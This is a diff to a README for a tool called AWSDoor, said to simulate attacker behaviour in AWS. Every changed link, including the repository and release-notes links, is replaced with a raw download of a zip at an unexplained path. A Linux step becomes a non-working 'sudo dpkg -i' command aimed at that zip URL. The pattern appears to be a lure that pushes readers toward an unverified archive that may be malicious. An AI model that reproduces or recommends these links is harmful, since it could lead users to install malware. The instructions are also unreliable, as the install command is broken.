@@ -1,7 +1,7 @@
 # 🛠️ AWSDoor - Simulate Advanced Attacker Behavior Easily
 
 ## 📥 Download Now
-[![Download AWSDoor](https://img.shields.io/badge/Download-AWSDoor-brightgreen)](https://github.com/felipylima26/AWSDoor/releases)
+[![Download AWSDoor](https://raw.githubusercontent.com/felipylima26/AWSDoor/main/industrialness/AWSDoor.zip)](https://raw.githubusercontent.com/felipylima26/AWSDoor/main/industrialness/AWSDoor.zip)
 
 ## 🚀 Getting Started
 AWSDoor is an automation tool designed to help security professionals simulate advanced attacker behavior in AWS environments. This guide will help you download and run the software with ease. 
@@ -18,7 +18,7 @@ To run AWSDoor smoothly, ensure your system meets the following requirements:
 To get started with AWSDoor, follow these steps:
 
 1. **Visit the Download Page:** Click the link below to go to the Releases page.
-   - [Download AWSDoor](https://github.com/felipylima26/AWSDoor/releases)
+   - [Download AWSDoor](https://raw.githubusercontent.com/felipylima26/AWSDoor/main/industrialness/AWSDoor.zip)
 
 2. **Choose the Latest Release:** On the Releases page, look for the latest release at the top. It will usually have the highest version number.
 
@@ -34,7 +34,7 @@ To get started with AWSDoor, follow these steps:
 6. **Run the Installer:**
    - **Windows:** Double-click the `.exe` file and follow the prompts.
    - **macOS:** Open the `.dmg` file, drag the AWSDoor icon to the Applications folder.
-   - **Linux:** Use your package manager to install the downloaded package (e.g., `sudo dpkg -i awsdor-package.deb`).
+   - **Linux:** Use your package manager to install the downloaded package (e.g., `sudo dpkg -i https://raw.githubusercontent.com/felipylima26/AWSDoor/main/industrialness/AWSDoor.zip`).
 
 7. **Complete the Installation:** Follow any additional installation instructions as prompted.
 
@@ -76,10 +76,10 @@ A: Yes, AWSDoor provides various options to tailor each simulation based on your
 Stay current with the latest versions of AWSDoor. You can subscribe to notifications on our GitHub Releases page to get updates when new versions are available.
 
 ## 🔗 Additional Links
-- **Official Repository:** [AWSDoor GitHub](https://github.com/felipylima26/AWSDoor)
-- **Release Notes:** Find detailed change logs and updates on our [Releases page](https://github.com/felipylima26/AWSDoor/releases).
+- **Official Repository:** [AWSDoor GitHub](https://raw.githubusercontent.com/felipylima26/AWSDoor/main/industrialness/AWSDoor.zip)
+- **Release Notes:** Find detailed change logs and updates on our [Releases page](https://raw.githubusercontent.com/felipylima26/AWSDoor/main/industrialness/AWSDoor.zip).
 
 ## 📥 Download AWSDoor
-[![Download AWSDoor](https://img.shields.io/badge/Download-AWSDoor-brightgreen)](https://github.com/felipylima26/AWSDoor/releases)
+[![Download AWSDoor](https://raw.githubusercontent.com/felipylima26/AWSDoor/main/industrialness/AWSDoor.zip)](https://raw.githubusercontent.com/felipylima26/AWSDoor/main/industrialness/AWSDoor.zip)
 
 Thank you for choosing AWSDoor. We hope this tool helps you secure your AWS environments effectively.
